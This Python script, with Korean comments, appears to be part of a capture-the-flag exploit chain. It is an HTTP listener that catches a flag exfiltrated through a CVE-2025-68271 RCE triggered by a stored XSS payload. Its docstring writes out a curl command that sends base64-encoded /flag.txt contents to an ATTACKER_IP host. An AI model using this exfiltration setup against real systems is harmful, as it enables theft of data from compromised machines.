#!/usr/bin/env python3
"""
CVE-2025-68271 RCE로 exfiltration되는 flag를 수신하는 리스너.

send_xss.py로 등록한 XSS 페이로드가 트리거되면, 대상 컨테이너 내부에서
  curl http://ATTACKER_IP:PORT/?f=$(cat /flag.txt | base64 -w0)
가 실행되어 flag가 base64로 인코딩된 채 이 서버로 GET 요청됩니다.

raw `nc`는 HTTP 응답을 돌려주지 않아 컨테이너 안의 curl이 응답을 기다리며
멈출 수 있으므로, 이 스크립트는 즉시 200을 응답하고 f 파라미터를 base64
디코드해 바로 출력합니다.

사용법:
  python3 flag_listener.py --port 4444
"""

import argparse
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs


class FlagHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

        if "f" in qs:
            try:
                flag = base64.b64decode(qs["f"][0]).decode(errors="replace").strip()
            except Exception as e:
                print(f"[!] base64 디코드 실패: {e} (raw: {qs['f'][0]!r})")
                return
            print(f"\n[+] FLAG 수신: {flag}\n")
        elif "d" in qs:
            print(f"[*] API 응답(디버그): {qs['d'][0][:300]}")
        elif "e" in qs:
            print(f"[!] 페이로드 에러: {qs['e'][0][:300]}")
        else:
            print(f"[*] 요청 수신: {self.path}")

    def log_message(self, format, *args):
        pass


def main():
    p = argparse.ArgumentParser(description="flag exfiltration 리스너")
    p.add_argument("--port", type=int, default=4444)
    p.add_argument("--bind", default="0.0.0.0")
    args = p.parse_args()

    print(f"[*] 리스닝: {args.bind}:{args.port}")
    HTTPServer((args.bind, args.port), FlagHandler).serve_forever()


if __name__ == "__main__":
    main()
